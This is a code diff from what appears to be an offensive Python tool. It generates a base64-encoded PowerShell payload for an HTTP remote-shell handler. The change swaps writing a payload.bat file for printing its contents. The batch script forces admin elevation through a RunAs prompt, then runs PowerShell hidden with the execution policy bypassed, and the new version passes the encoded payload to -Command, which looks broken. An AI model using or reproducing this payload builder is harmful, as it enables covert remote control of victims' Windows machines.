@@ -10,19 +10,9 @@ e_payload = base64.b64encode(payload.encode('utf-16le')).decode('utf-8')
 print(f"{GREEN}PAYLOAD:{END}")
 print (f"powershell -e {e_payload}")
 
-print(f"{GREEN}PAYLOAD .bat created{END}")
+print(f"{GREEN}PAYLOAD .bat{END}")
 print("")
-f = open("payload.bat", "w")
-f.write("@echo off\n")
-f.write("net session >nul 2>&1\n")
-f.write("if %errorLevel% == 0 (\n")
-f.write("  goto start\n")
-f.write(") else (\n")
-f.write(f"  powershell -Command \"Start-Process '%comspec%' -ArgumentList '/c %~dpnx0' -Verb RunAs\" && exit\n")
-f.write(")\n")
-f.write(":start\n")
-f.write(f"powershell -NoProfile -ExecutionPolicy Bypass -W hidden -e {e_payload}")
-f.close()
+print(f"@echo off\nnet session >nul 2>&1\nif %errorLevel% == 0 (\n  goto start\n) else (\n  powershell -Command \"Start-Process '%comspec%' -ArgumentList '/c %~dpnx0' -Verb RunAs\" && exit\n)\n:start\npowershell -NoProfile -ExecutionPolicy Bypass -W hidden -Command \"{e_payload}\"\n")
 
 class Http_Shell(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
